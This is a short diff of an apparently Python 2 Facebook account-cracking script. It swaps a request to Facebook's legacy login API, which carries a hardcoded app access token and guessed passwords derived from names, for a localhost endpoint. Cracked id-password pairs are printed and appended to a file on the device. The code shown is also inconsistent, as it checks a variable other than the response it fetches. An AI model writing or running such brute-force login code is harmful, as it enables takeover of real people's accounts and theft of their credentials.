@@ -238,8 +238,9 @@ def choice1_menu():
 		except OSError:
 		    pass
 		try:
-		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=br.addheader).text
-		    if "access_token" in q:
+		    pass1 = name.lower() + p1
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
+		    if "loc" in q:
 			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
 			ok = open('/sdcard/ids/jam_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass1 + '\n')
